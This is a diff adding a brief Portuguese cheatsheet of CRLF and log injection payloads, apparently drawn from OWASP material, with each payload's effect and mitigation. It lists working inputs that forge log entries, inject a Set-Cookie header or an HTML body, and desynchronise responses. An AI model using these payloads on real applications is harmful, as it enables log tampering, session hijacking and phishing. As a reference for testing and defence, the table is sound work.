@@ -1,0 +1,9 @@
+# CRLF / Log Injection - cheatsheet (reimplementado de OWASP / PayloadsAllTheThings)
+# USO SOMENTE em sistemas proprios/autorizados.
+#
+# PAYLOAD                                                  | EFEITO                              | MITIGACAO
+mallory\nINFO user=admin login=SUCCESS                    | entrada de log forjada             | sanitizar \r\n + log estruturado
+%0d%0aSet-Cookie:%20role=admin                            | injeta cookie (response splitting) | rejeitar CR/LF em header
+%0d%0a%0d%0a<html>phish</html>                            | injeta corpo de resposta           | rejeitar CR/LF em header
+foo%0d%0aContent-Length:%200                              | dessincroniza a resposta           | rejeitar CR/LF em header
+user\r\radmin                                             | \r isolado engana parsers de log   | sanitizar controles
